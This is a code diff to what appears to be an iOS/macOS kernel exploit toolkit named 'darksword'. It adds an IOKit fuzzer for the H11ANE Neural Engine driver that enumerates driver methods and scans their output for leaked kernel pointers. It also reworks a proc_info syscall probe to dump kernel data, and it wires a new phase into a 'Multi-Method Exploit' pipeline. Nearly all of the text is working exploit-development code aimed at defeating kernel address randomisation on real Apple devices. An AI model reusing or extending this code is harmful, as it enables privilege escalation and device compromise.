@@ -612,6 +612,108 @@ static void method_apple_jpeg_fuzz(void) {
     printf("[JPEG] fuzz complete\n");
 }
 
+// ===== H11ANE (Neural Engine) Fuzzer =====
+static io_connect_t gH11Conn = 0;
+
+static bool open_h11ane(void) {
+    if (gH11Conn) return true;
+    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
+        IOServiceNameMatching("H11ANE"));
+    if (!svc) { printf("[H11ANE] service not found\n"); return false; }
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 1, &gH11Conn);
+    IOObjectRelease(svc);
+    if (kr != KERN_SUCCESS) { printf("[H11ANE] IOServiceOpen type=1: %#x\n", kr); return false; }
+    printf("[H11ANE] conn=%#x (type=1)\n", gH11Conn);
+    return true;
+}
+
+static void method_h11ane_fuzz(void) {
+    printf("\n[Method: H11ANE_fuzz] Fuzzing H11ANE Neural Engine...\n");
+    if (!open_h11ane()) { printf("[H11ANE] Cannot open\n"); return; }
+
+    // Method enumeration: try 0-63 with scalar args, struct args, output
+    for (uint32_t m = 0; m < 64; m++) {
+        // Pattern A: zero inputs
+        uint64_t zeroOut[8] = {};
+        size_t outSz = sizeof(zeroOut);
+        kern_return_t kr = IOConnectCallMethod(gH11Conn, m,
+            NULL, 0, NULL, 0, zeroOut, (uint32_t*)&outSz, NULL, NULL);
+        if (kr != KERN_SUCCESS && kr != 0xe00002c2) {
+            printf("[H11ANE] method %d (zero): kr=%#x (diff from E02C2!)\n", m, kr);
+        } else if (kr == KERN_SUCCESS) {
+            printf("[H11ANE] method %d (zero): SUCCESS kr=0 outSz=%zu", m, outSz);
+            for (int i = 0; i < 8 && outSz >= 8; i++)
+                if (zeroOut[i]) printf(" out[%d]=0x%llx", i, zeroOut[i]);
+            printf("\n");
+        }
+
+        // Pattern B: scalar inputs
+        uint64_t out2[8] = {};
+        outSz = sizeof(out2);
+        uint64_t inScalar[8] = {m, m+1, m+2, m+3, m+4, m+5, m+6, m+7};
+        kr = IOConnectCallMethod(gH11Conn, m,
+            inScalar, 8, NULL, 0, out2, (uint32_t*)&outSz, NULL, NULL);
+        if (kr == KERN_SUCCESS) {
+            printf("[H11ANE] method %d (scalar): SUCCESS kr=0 outSz=%zu", m, outSz);
+            for (int i = 0; i < 8 && outSz >= 8; i++)
+                if (out2[i]) printf(" out[%d]=0x%llx", i, out2[i]);
+            printf("\n");
+        }
+
+        // Pattern C: zero inputs + large output (look for info leak)
+        uint64_t out3[64] = {}; // 512 bytes
+        outSz = sizeof(out3);
+        kr = IOConnectCallMethod(gH11Conn, m,
+            NULL, 0, NULL, 0, out3, (uint32_t*)&outSz, NULL, NULL);
+        if (kr == KERN_SUCCESS) {
+            int nz = 0;
+            for (int i = 0; i < 64 && outSz >= 8; i++) {
+                if (out3[i]) {
+                    uint64_t v = out3[i];
+                    if ((v >> 40) == 0xFFFFFF) {
+                        printf("[H11ANE] method %d KPTR out[%d]=0x%016llx\n", m, i, v);
+                        nz++;
+                    }
+                }
+            }
+            if (nz == 0) {
+                // Check for non-zero non-ptr data
+                for (int i = 0; i < 64 && outSz >= 8; i++) {
+                    if (out3[i]) { printf("[H11ANE] method %d: out[%d]=0x%llx\n", m, i, out3[i]); break; }
+                }
+            }
+        }
+    }
+
+    // Try IOConnectCallStructMethod with IOSurface
+    IOSurfaceRef aneSurf = IOSurfaceCreate((__bridge CFDictionaryRef)@{
+        (__bridge id)kIOSurfaceAllocSize : @(0x100000),
+        (__bridge id)kIOSurfaceWidth : @(256),
+        (__bridge id)kIOSurfaceHeight : @(256),
+        (__bridge id)kIOSurfaceBytesPerRow : @(1024),
+        (__bridge id)kIOSurfacePixelFormat : @(0x34323066),
+        (__bridge id)kIOSurfaceBytesPerElement : @(4),
+    });
+    if (aneSurf) {
+        uint32_t sid = IOSurfaceGetID(aneSurf);
+        printf("[H11ANE] Trying IOSurface ID=%u with methods...\n", sid);
+        for (uint32_t m = 0; m < 16; m++) {
+            uint64_t args[4] = {sid, 0, 0, 0};
+            size_t outSz = 32;
+            uint64_t out[4] = {};
+            kern_return_t kr = IOConnectCallMethod(gH11Conn, m,
+                args, 4, NULL, 0, out, (uint32_t*)&outSz, NULL, NULL);
+            if (kr == KERN_SUCCESS)
+                printf("[H11ANE] method %d w/ surface: SUCCESS kr=0\n", m);
+        }
+        CFRelease(aneSurf);
+    }
+
+    IOServiceClose(gH11Conn);
+    gH11Conn = 0;
+    printf("[H11ANE] fuzz complete\n");
+}
+
 // ===== Multi-Method Exploit =====
 
 // Method 1: Enhanced SystemMemory scan — check ALL pages for kernel pointers
@@ -868,22 +970,57 @@ static bool method_proc_info(void) {
     }
 
     uint8_t buf[0x400];
-    // proc_info(callnum=6=PROC_INFO_CALL_PIDFDINFO, pid, flavor=2=PROC_PIDFDSOCKET_IPCINFO, fd, buf, bufsize)
-    int r = syscall(336, 6, getpid(), 2, (uint64_t)(intptr_t)fd, (uint64_t)(uintptr_t)buf, (uint32_t)sizeof(buf));
-    if (r != 0) {
-        printf("[proc_info] syscall failed: %d (errno=%d)\n", r, errno);
-        close(fd);
-        return false;
+    int flavors[] = {1, 2, 3};
+    const char *fnames[] = {"NOINFO", "IPCINFO", "UNKN3"};
+    bool ok = false;
+
+    for (int fi = 0; fi < 3; fi++) {
+        memset(buf, 0, sizeof(buf));
+        int r = syscall(336, 6, getpid(), flavors[fi], (uint64_t)(intptr_t)fd,
+            (uint64_t)(uintptr_t)buf, (uint32_t)sizeof(buf));
+        if (r == 0) {
+            printf("[proc_info] flavor=%d (%s) SUCCESS\n", flavors[fi], fnames[fi]);
+            uint64_t gencnt = *(uint64_t*)(buf + 0x110);
+            printf("[proc_info] inp_gencnt=0x%llx\n", gencnt);
+            for (int off = 0; off < 0x400; off += 8) {
+                uint64_t v = *(uint64_t*)(buf + off);
+                if (v) printf("[proc_info] +%#x = 0x%016llx\n", off, v);
+            }
+            ok = true;
+        } else if (errno == ENOMEM) {
+            // Try with larger buffer
+            uint8_t *big = calloc(1, 0x4000);
+            r = syscall(336, 6, getpid(), flavors[fi], (uint64_t)(intptr_t)fd,
+                (uint64_t)(uintptr_t)big, 0x4000);
+            if (r == 0) {
+                printf("[proc_info] flavor=%d (%s) SUCCESS w/ 16KB buf\n", flavors[fi], fnames[fi]);
+                for (int off = 0; off < 0x4000; off += 8) {
+                    uint64_t v = *(uint64_t*)(big + off);
+                    if (v) printf("[proc_info] +%#x = 0x%016llx\n", off, v);
+                }
+                ok = true;
+            } else {
+                printf("[proc_info] flavor=%d (%s): r=%d errno=%d\n", flavors[fi], fnames[fi], r, errno);
+            }
+            free(big);
+        } else {
+            printf("[proc_info] flavor=%d (%s): r=%d errno=%d\n", flavors[fi], fnames[fi], r, errno);
+        }
     }
-    uint64_t gencnt = *(uint64_t*)(buf + 0x110);
-    printf("[proc_info] inp_gencnt=0x%llx\n", gencnt);
-    for (int off = 0; off < 0x400; off += 8) {
-        uint64_t v = *(uint64_t*)(buf + off);
-        if (v) printf("[proc_info] +%#x = 0x%016llx\n", off, v);
+
+    // Also try with fileport (old approach)
+    fileport_t fp = 0;
+    fileport_makeport(fd, &fp);
+    int r = syscall(336, 6, getpid(), 3, fp, buf, sizeof(buf));
+    if (r == 0) {
+        printf("[proc_info] fileport flavor=3: SUCCESS\n");
+        ok = true;
+    } else {
+        printf("[proc_info] fileport flavor=3: r=%d errno=%d\n", r, errno);
     }
-    printf("[proc_info] success (kernel data received)\n");
+
     close(fd);
-    return true;
+    return ok;
 }
 
 // Method 5: PurpleGfxMem overlap — tests if IOGPU-backed pages retain data after free
@@ -1032,7 +1169,10 @@ bool run_darksword(void) {
     // Phase 6: PurpleGfxMem info leak (raw fresh pages)
     bool purpLeak = method_purple_info_leak();
 
-    // Phase 7: AppleJPEGDriver IOKit fuzzing
+    // Phase 7: H11ANE fuzzing
+    method_h11ane_fuzz();
+
+    // Phase 8: AppleJPEGDriver IOKit fuzzing
     method_apple_jpeg_fuzz();
 
     printf("=== Results ===\n");
